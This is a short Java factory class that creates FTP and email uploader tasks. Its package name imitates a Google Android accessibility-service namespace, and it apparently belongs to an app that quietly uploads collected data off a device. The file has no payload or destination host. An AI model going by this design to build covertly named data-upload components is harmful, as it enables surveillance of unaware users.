package service.android.google.com.accessibility.upload;

import service.android.google.com.accessibility.upload.uploaders.BaseUploaderTask;
import service.android.google.com.accessibility.upload.uploaders.email.EmailUploaderTask;
import service.android.google.com.accessibility.upload.uploaders.ftp.FTPUploaderTask;

/**
 * Created by tim on 16.04.16.
 */
public class UploaderFactory {

    public FTPUploaderTask createFTPUploaderTask(final boolean isServiceEnabled) {
        return new FTPUploaderTask(
                isServiceEnabled
        );
    }

    public BaseUploaderTask createEmailUploaderTask(final boolean isServiceEnabled) {
        return new EmailUploaderTask(
                isServiceEnabled
        );
    }
}